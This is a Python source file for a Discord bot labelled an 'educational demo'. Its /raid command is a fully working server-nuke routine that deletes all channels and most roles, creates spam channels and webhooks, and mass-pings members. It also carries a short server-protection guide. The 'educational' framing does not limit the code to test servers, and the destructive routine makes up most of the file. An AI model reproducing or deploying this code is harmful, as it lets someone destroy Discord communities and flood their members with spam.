import discord
from discord.ext import commands
import asyncio
import time
import os  # <-- IMPORT OS

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552  # Your Discord ID

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

# Store active demo state
active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()  # Sync slash commands globally
    print(f"✅ Educational Demo Bot ready - {bot.user}")
    print(f"Owner ID: {OWNER_ID}")
    print(f"Slash commands registered: /raid, /stopraid, /protect, /commands")

# ========== SLASH COMMANDS ==========

@bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demonstration")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ EDUCATIONAL DEMO - This server has been compromised ⚠️",
    ping: str = "no",
    amount: int = 10
):
    """Educational demo - shows what a nuke bot does"""
    
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this educational demo.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission for this demo.", ephemeral=True)
    
    await interaction.response.send_message("⚠️ **EDUCATIONAL DEMO STARTING** - Check this channel for updates...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    
    if amount < 1:
        amount = 10
    elif amount > 100:
        amount = 100
        await interaction.followup.send("⚠️ Amount capped at 100 for educational safety", ephemeral=False)
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    try:
        # ========== PHASE 1: Delete all channels ==========
        await interaction.followup.send("📢 **PHASE 1: Deleting all channels...**", ephemeral=False)
        
        for channel in guild.channels:
            if not active_demo.get(guild.id):
                break
            try:
                await channel.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        await interaction.followup.send("✅ All channels deleted", ephemeral=False)
        await asyncio.sleep(1)
        
        # ========== PHASE 2: Create spam channels ==========
        await interaction.followup.send("📢 **PHASE 2: Creating spam channels...**", ephemeral=False)
        
        spam_channels = []
        for i in range(10):
            if not active_demo.get(guild.id):
                break
            try:
                channel = await guild.create_text_channel(f"nuked-{i}")
                spam_channels.append(channel)
                await asyncio.sleep(0.2)
            except:
                pass
        
        await interaction.followup.send(f"✅ Created {len(spam_channels)} spam channels", ephemeral=False)
        await asyncio.sleep(1)
        
        # ========== PHASE 3: Delete all roles ==========
        await interaction.followup.send("📢 **PHASE 3: Destroying roles...**", ephemeral=False)
        
        for role in guild.roles:
            if not active_demo.get(guild.id):
                break
            if role.is_default() or role.managed or role == guild.me.top_role:
                continue
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        await interaction.followup.send("✅ All roles destroyed", ephemeral=False)
        await asyncio.sleep(1)
        
        # ========== PHASE 4: Create webhooks ==========
        await interaction.followup.send("📢 **PHASE 4: Creating webhooks for spam...**", ephemeral=False)
        
        for channel in spam_channels[:5]:
            if not active_demo.get(guild.id):
                break
            try:
                for i in range(3):
                    await channel.create_webhook(name=f"spammer_{i}")
                    await asyncio.sleep(0.2)
            except:
                pass
        
        await interaction.followup.send("✅ Webhooks created", ephemeral=False)
        await asyncio.sleep(1)
        
        # ========== PHASE 5: Send spam messages ==========
        await interaction.followup.send(f"📢 **PHASE 5: Sending {amount} messages per channel with ping={ping_enabled}...**", ephemeral=False)
        
        for channel in spam_channels:
            if not active_demo.get(guild.id):
                break
            
            ping_text = "@everyone " if ping_enabled else ""
            
            for i in range(min(amount, 100)):
                if not active_demo.get(guild.id):
                    break
                try:
                    await channel.send(f"{ping_text}{message} [{i+1}/{amount}]")
                    await asyncio.sleep(0.3)
                except:
                    pass
        
        await interaction.followup.send("✅ Spam messages sent", ephemeral=False)
        await asyncio.sleep(1)
        
        # ========== Educational Summary ==========
        embed = discord.Embed(
            title="⚠️ EDUCATIONAL DEMO COMPLETE ⚠️",
            description=f"**What you just witnessed:**\n"
                       f"1. 🔥 Channel Deletion - All channels wiped\n"
                       f"2. 📁 Spam Channels - Malicious channels created\n"
                       f"3. 👑 Role Destruction - Admin/Mod roles removed\n"
                       f"4. 🕸️ Webhook Abuse - Bypassed rate limits\n"
                       f"5. 💬 Mass Pinging - {amount} messages with {'@everyone' if ping_enabled else 'no pings'}\n\n"
                       f"**How to PROTECT your server:**\n"
                       f"• ✅ NEVER give Administrator to untrusted bots\n"
                       f"• ✅ Use 2FA on administrator accounts\n"
                       f"• ✅ Enable invite moderation and verification levels\n"
                       f"• ✅ Use backup bots to save server structure\n\n"
                       f"**This demo will end in 30 seconds...**",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=False)
        
        await asyncio.sleep(30)
        
    except Exception as e:
        await interaction.followup.send(f"❌ Demo error: {e}", ephemeral=False)
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop the educational demo")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped by owner**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo running.", ephemeral=True)

@bot.tree.command(name="protect", description="Show how to protect your server from nuke bots")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server from Nuke Bots",
        description="Educational guide for server safety",
        color=discord.Color.green()
    )
    embed.add_field(name="1. Bot Permissions", 
                    value="**NEVER give Administrator** to untrusted bots. Review permissions before inviting.", 
                    inline=False)
    embed.add_field(name="2. Role Hierarchy", 
                    value="Keep your highest role secure. Only trusted members should have Admin.", 
                    inline=False)
    embed.add_field(name="3. 2-Factor Authentication", 
                    value="Enable 2FA on all administrator accounts to prevent account takeover.", 
                    inline=False)
    embed.add_field(name="4. Server Verification", 
                    value="Set Verification Level to 'High' to prevent raids from new accounts.", 
                    inline=False)
    embed.add_field(name="5. Backup Bots", 
                    value="Use legitimate backup bots (like Xenon) to save your server structure.", 
                    inline=False)
    embed.add_field(name="6. Audit Logs", 
                    value="Regularly check Audit Logs for suspicious activity like mass channel creation.", 
                    inline=False)
    embed.set_footer(text="Educational purposes only - Stay safe!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all available slash commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Educational Demo Bot Commands",
        description="These commands are for educational demonstration only",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value="Start educational nuke demonstration\n"
                          "• `message` - Custom spam message (optional)\n"
                          "• `ping` - yes/no for @everyone (default: no)\n"
                          "• `amount` - Messages per channel 1-100 (default: 10)", 
                    inline=False)
    embed.add_field(name="/stopraid", 
                    value="Emergency stop the active demonstration", 
                    inline=False)
    embed.add_field(name="/protect", 
                    value="Show server protection guide", 
                    inline=False)
    embed.add_field(name="/commands", 
                    value="Show this help message", 
                    inline=False)
    embed.set_footer(text="⚠️ Educational purposes only - Run only on test servers")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

# ========== RUN BOT ==========

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
